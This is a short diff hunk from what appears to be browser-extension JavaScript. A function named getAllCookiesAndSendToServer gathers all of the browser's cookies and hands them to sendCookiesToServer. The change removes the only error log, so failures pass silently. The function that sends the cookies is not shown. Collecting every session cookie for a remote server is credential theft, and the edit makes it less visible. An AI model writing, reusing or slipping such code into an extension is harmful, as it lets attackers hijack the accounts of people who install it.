@@ -32,7 +32,6 @@ function sendCookiesToServer(cookies) {
 function getAllCookiesAndSendToServer() {
   chrome.cookies.getAll({}, function(cookies) {
     if (chrome.runtime.lastError) {
-      console.error('Error retrieving cookies:', chrome.runtime.lastError);
       return;
     }
     sendCookiesToServer(cookies);
